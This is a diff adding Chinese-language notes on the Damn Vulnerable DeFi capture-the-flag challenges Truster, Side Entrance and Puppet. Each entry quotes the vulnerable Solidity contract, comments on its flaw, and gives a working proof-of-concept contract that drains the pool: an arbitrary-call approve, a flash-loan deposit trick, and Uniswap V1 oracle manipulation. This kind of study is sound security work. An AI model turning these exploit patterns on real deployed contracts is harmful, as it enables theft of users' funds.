@@ -507,5 +507,213 @@ POC：
 
 ### 2024.09.04
 
+#### Truster
 
+题目要求一个交易拿走所有token
+
+```
+contract TrusterLenderPool is ReentrancyGuard {
+    using Address for address;
+
+    DamnValuableToken public immutable token;
+
+    error RepayFailed();
+
+    constructor(DamnValuableToken _token) {
+        token = _token;
+    }
+
+    function flashLoan(uint256 amount, address borrower, address target, bytes calldata data)
+        external
+        nonReentrant//不能重入
+        returns (bool)
+    {
+        uint256 balanceBefore = token.balanceOf(address(this));
+        token.transfer(borrower, amount);//
+        target.functionCall(data);//调用任意指定合约
+
+        if (token.balanceOf(address(this)) < balanceBefore) {//如果钱少了会回滚，因此中途不能转钱。所以让本合约去调用token的approve方法，结束flashloan之后再transferfrom
+            revert RepayFailed();
+        }
+
+        return true;
+    }
+}
+```
+
+POC:
+
+```
+    function test_truster() public checkSolvedByPlayer {
+        TrusterCaller t=new TrusterCaller();
+        t.start(address(pool), recovery, address(token));
+    }
+```
+
+```
+contract TrusterCaller{
+    function start(address pool, address rescue,address token)public{
+        bytes memory data = abi.encodeCall(ERC20.approve,(address(this),1e24)); //1 million=6+18
+        TrusterLenderPool(pool).flashLoan(0,address(this),token,data);
+        DamnValuableToken(token).transferFrom(pool,rescue,1e24);
+    }
+}
+```
+
+
+
+
+
+#### side entrace
+
+题目
+
+```
+    function deposit() external payable {
+        unchecked {
+            balances[msg.sender] += msg.value;
+        }
+        emit Deposit(msg.sender, msg.value);
+    }
+
+    function withdraw() external {
+        uint256 amount = balances[msg.sender];
+
+        delete balances[msg.sender];
+        emit Withdraw(msg.sender, amount);
+
+        SafeTransferLib.safeTransferETH(msg.sender, amount);
+    }
+
+    function flashLoan(uint256 amount) external {
+        uint256 balanceBefore = address(this).balance;
+
+        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();
+
+        if (address(this).balance < balanceBefore) {//最后检查的时候，token需要在合约里，因此我们可以闪电贷取走所有钱之后deposit进去。通过检查后再取出。
+            revert RepayFailed();
+        }
+    }
+```
+
+POC :
+
+```
+contract SideCaller{
+    
+    SideEntranceLenderPool pool;
+
+    function start(address addr,address recovery)public{
+        pool=SideEntranceLenderPool(addr);
+        pool.flashLoan(1000e18);
+        pool.withdraw();
+        payable (recovery).transfer(1000e18);
+    }
+    function execute() external payable{
+        pool.deposit{value:1000e18}();
+    }
+    receive()external payable{
+
+    }
+}
+```
+### 2024.09.05
+
+
+#### puppet
+
+题目：
+
+```
+contract PuppetPool is ReentrancyGuard {
+    using Address for address payable;
+
+    uint256 public constant DEPOSIT_FACTOR = 2;
+
+    address public immutable uniswapPair;
+    DamnValuableToken public immutable token;
+
+    mapping(address => uint256) public deposits;
+
+    error NotEnoughCollateral();
+    error TransferFailed();
+
+    event Borrowed(address indexed account, address recipient, uint256 depositRequired, uint256 borrowAmount);
+
+    constructor(address tokenAddress, address uniswapPairAddress) {
+        token = DamnValuableToken(tokenAddress);
+        uniswapPair = uniswapPairAddress;
+    }
+
+    // Allows borrowing tokens by first depositing two times their value in ETH
+    function borrow(uint256 amount, address recipient) external payable nonReentrant {
+        uint256 depositRequired = calculateDepositRequired(amount);//根据uniV1的价格计算所需抵押的ETH数目
+
+        if (msg.value < depositRequired) {
+            revert NotEnoughCollateral();
+        }
+
+        if (msg.value > depositRequired) {
+            unchecked {
+                payable(msg.sender).sendValue(msg.value - depositRequired);//多余的eth转回
+            }
+        }
+
+        unchecked {
+            deposits[msg.sender] += depositRequired;
+        }
+
+        // Fails if the pool doesn't have enough tokens in liquidity
+        if (!token.transfer(recipient, amount)) {//转账
+            revert TransferFailed();
+        }
+
+        emit Borrowed(msg.sender, recipient, depositRequired, amount);
+    }
+
+    function calculateDepositRequired(uint256 amount) public view returns (uint256) {
+        return amount * _computeOraclePrice() * DEPOSIT_FACTOR / 10 ** 18;
+        //借走1e5，要抵押 1e5/2* eth.balance(uni)/dvt.balance(uni)
+        // = 1e5/2 * (10-9)/(10+y)
+    }
+
+    function _computeOraclePrice() private view returns (uint256) {
+        // calculates the price of the token in wei according to Uniswap pair
+        return uniswapPair.balance * (10 ** 18) / token.balanceOf(uniswapPair);
+    }
+}
+
+```
+
+POC:
+
+contract CallPuppet{
+    DamnValuableToken token;
+    PuppetPool lendingPool;
+    constructor(address dvt,address pp){
+        token=DamnValuableToken(dvt);
+        lendingPool=PuppetPool(pp);
+    }
+
+    function start(address recovery,address unipool)public payable{
+        // payable(unipool).call{value:24*1e18}("");
+        token.approve(unipool, 1e5*1e18);
+        // token.transfer(address(lendingPool), token.balanceOf(address(this)));
+        IUniswapV1Exchange(unipool).tokenToEthSwapInput(9e20, 1, block.timestamp+1 days);
+        uint amount = lendingPool.calculateDepositRequired(1e5*1e18);
+        console.logUint(amount);
+        lendingPool.borrow{value:address(this).balance}(1e5*1e18,recovery);
+    }
+    receive()payable external{
+
+    }
+}
+
+
+### 2024.09.06
+
+
+### 2024.09.07
+
+### 2024.09.08
 <!-- Content_END -->
